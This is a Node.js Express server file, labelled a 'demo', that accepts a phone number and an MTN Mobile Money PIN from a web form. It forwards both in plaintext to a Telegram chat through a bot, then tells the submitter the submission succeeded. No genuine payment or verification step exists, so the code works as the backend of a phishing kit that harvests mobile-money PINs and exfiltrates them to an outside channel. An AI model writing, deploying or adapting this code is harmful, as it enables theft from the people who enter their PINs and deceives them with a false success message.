const express = require("express");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));


app.post("/mtn-submission", async (req, res) => {

  const { phone, mtnPin } = req.body;

  // Mtn phone validation
  if (
    typeof phone !== "string" ||
    !/^7[0-9]{8}$/.test(phone)
  ) {
    return res.status(400).json({
      success: false,
      message: "Invalid demo number."
    });
  }

  // Mtn PIN validation
  if (
    typeof mtnPin !== "string" ||
    !/^[0-9]{5}$/.test(mtnPin)
  ) {
    return res.status(400).json({
      success: false,
      message: "Mtn PIN is required."
    });
  }


  /*
    Generate date/time on the server.
    East Africa Time = UTC+3.
  */
  const now = new Date();

  const date = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Africa/Nairobi",
    year: "numeric",
    month: "2-digit",
    day: "2-digit"
  }).format(now);

  const time = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Africa/Nairobi",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  }).format(now);


  const message =
`🧪 MTN MoMo DEMO SUBMISSION

Number: ${phone}
Mtn PIN: ${mtnPin}

Status: Successful
Date: ${date}
Time: ${time}

By continuing you accept our terms and privacy policy.`;


  try {

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram environment variables are missing.");

      return res.status(500).json({
        success: false,
        message: "Telegram is not configured."
      });
    }


    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );


    const telegramData = await telegramResponse.json();


    if (!telegramResponse.ok || !telegramData.ok) {

      console.error(
        "Telegram error:",
        telegramData
      );

      return res.status(500).json({
        success: false,
        message: "Telegram notification failed."
      });
    }


    return res.json({
      success: true,
      message: "Mtn submission successful."
    });


  } catch (error) {

    console.error(
      "Server error:",
      error
    );

    return res.status(500).json({
      success: false,
      message: "Unable to send demo notification."
    });
  }

});


app.listen(PORT, () => {
  console.log(`Demo server running on port ${PORT}`);
});
